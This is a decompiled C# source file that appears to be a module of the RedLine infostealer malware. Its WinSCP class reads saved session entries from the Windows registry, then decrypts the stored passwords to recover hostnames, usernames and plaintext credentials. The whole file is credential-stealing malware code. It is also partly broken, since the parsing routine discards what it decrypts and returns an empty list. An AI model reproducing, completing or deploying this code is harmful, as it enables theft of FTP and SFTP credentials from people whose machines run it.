using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using RedLine.Models;

namespace RedLine.Logic.FtpClients
{
	// Token: 0x02000062 RID: 98
	public static class WinSCP
	{
		// Token: 0x060002AD RID: 685 RVA: 0x0000BCAC File Offset: 0x00009EAC
		public static List<LoginPair> ParseConnections()
		{
			List<LoginPair> result = new List<LoginPair>();
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Sessions"))
				{
					if (registryKey != null)
					{
						foreach (string path in registryKey.GetSubKeyNames())
						{
							string name = Path.Combine("Software\\Martin Prikryl\\WinSCP 2\\Sessions", path);
							using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name))
							{
								if (registryKey2 != null)
								{
									object value = registryKey2.GetValue("HostName");
									string text = (value != null) ? value.ToString() : null;
									if (!string.IsNullOrWhiteSpace(text))
									{
										object value2 = registryKey2.GetValue("UserName");
										string user = (value2 != null) ? value2.ToString() : null;
										object value3 = registryKey2.GetValue("Password");
										WinSCP.DecryptPassword(user, (value3 != null) ? value3.ToString() : null, text);
										string str = text;
										string str2 = ":";
										object value4 = registryKey2.GetValue("PortNumber");
										text = str + str2 + ((value4 != null) ? value4.ToString() : null);
									}
								}
							}
						}
					}
				}
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x060002AE RID: 686 RVA: 0x0000BDE4 File Offset: 0x00009FE4
		private static int DecodeNextChar(List<string> list)
		{
			return 255 ^ (((int.Parse(list[0]) << 4) + int.Parse(list[1]) ^ 163) & 255);
		}

		// Token: 0x060002AF RID: 687 RVA: 0x0000BE14 File Offset: 0x0000A014
		private static string DecryptPassword(string user, string pass, string host)
		{
			string result;
			try
			{
				if (user == string.Empty || pass == string.Empty || host == string.Empty)
				{
					result = "";
				}
				else
				{
					List<string> list = (from keyf in pass
					select keyf.ToString()).ToList<string>();
					List<string> list2 = new List<string>();
					for (int i = 0; i < list.Count; i++)
					{
						if (list[i] == "A")
						{
							list2.Add("10");
						}
						if (list[i] == "B")
						{
							list2.Add("11");
						}
						if (list[i] == "C")
						{
							list2.Add("12");
						}
						if (list[i] == "D")
						{
							list2.Add("13");
						}
						if (list[i] == "E")
						{
							list2.Add("14");
						}
						if (list[i] == "F")
						{
							list2.Add("15");
						}
						if ("ABCDEF".IndexOf(list[i]) == -1)
						{
							list2.Add(list[i]);
						}
					}
					List<string> list3 = list2;
					int num;
					if (WinSCP.DecodeNextChar(list3) == 255)
					{
						num = WinSCP.DecodeNextChar(list3);
					}
					list3.Remove(list3[0]);
					list3.Remove(list3[0]);
					list3.Remove(list3[0]);
					list3.Remove(list3[0]);
					num = WinSCP.DecodeNextChar(list3);
					List<string> list4 = list3;
					list4.Remove(list4[0]);
					list4.Remove(list4[0]);
					int num2 = WinSCP.DecodeNextChar(list3) * 2;
					for (int j = 0; j < num2; j++)
					{
						list3.Remove(list3[0]);
					}
					string text = "";
					for (int k = -1; k < num; k++)
					{
						string str = ((char)WinSCP.DecodeNextChar(list3)).ToString();
						list3.Remove(list3[0]);
						list3.Remove(list3[0]);
						text += str;
					}
					string text2 = user + host;
					int count = text.IndexOf(text2, StringComparison.Ordinal);
					text = text.Remove(0, count);
					text = text.Replace(text2, "");
					result = text;
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}
	}
}
